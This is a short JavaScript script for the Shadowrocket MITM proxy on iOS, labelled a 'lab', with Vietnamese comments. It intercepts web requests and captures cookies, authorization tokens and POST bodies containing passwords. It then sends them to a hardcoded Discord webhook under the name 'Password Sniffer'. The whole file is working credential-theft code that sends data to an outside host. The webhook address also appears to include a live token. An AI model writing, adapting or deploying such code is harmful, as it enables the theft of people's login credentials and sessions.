/*
  Lab: Full Data Capture (Cookie + Password)
  Author: TungTinTacKMA
  Target: Header (Cookie) & Body (Password)
*/

var request = $request;
var headers = request.headers;
var body = request.body; // Đây là biến chứa Mật khẩu
var url = request.url;
var method = request.method;

// CẤU HÌNH WEBHOOK (Thay link của bạn vào)
var webhookUrl = "https://discordapp.com/api/webhooks/1454883739288211571/F2PbYyI-KgV3YkYVhZzDsdlxRBBwiQ26eg5dNkYld6HT_OJNv8mYWFevFvzi9mt-Tlp3";

// --- PHÂN TÍCH DỮ LIỆU ---

var capturedInfo = "";
var isHit = false; // Biến kiểm tra xem có bắt được gì không

// 1. Kiểm tra Cookie/Token (Trong Header)
var cookie = headers['Cookie'] || headers['cookie'] || headers['Authorization'];
if (cookie) {
    capturedInfo += "🍪 **COOKIE/TOKEN:**\n" + cookie.substring(0, 500) + "\n\n";
    isHit = true;
}

// 2. Kiểm tra Mật khẩu (Trong Body - Chỉ áp dụng cho method POST)
// Thường body sẽ có dạng: "username=admin&password=123456"
if (body && method === "POST") {
    capturedInfo += "🔑 **POST BODY (Chứa Password):**\n```" + body + "```\n";
    isHit = true;
}

// --- GỬI VỀ DISCORD ---
// Chỉ gửi nếu bắt được dữ liệu VÀ không phải file rác
var isNotJunk = !url.match(/\.(css|jpg|png|woff)/);

if (isHit && isNotJunk) {
    var payload = {
        "username": "Password Sniffer",
        "avatar_url": "https://cdn-icons-png.flaticon.com/512/2991/2991108.png",
        "embeds": [{
            "title": "🚨 BẮT ĐƯỢC DỮ LIỆU ĐĂNG NHẬP!",
            "color": 16711680,
            "fields": [
                { "name": "Mục tiêu", "value": url },
                { "name": "Dữ liệu thu được", "value": capturedInfo }
            ],
            "footer": { "text": "Shadowrocket MITM Lab" }
        }]
    };

    $httpClient.post({
        url: webhookUrl,
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(payload)
    }, function(error, response, data) {
        $done({});
    });
} else {
    $done({});
}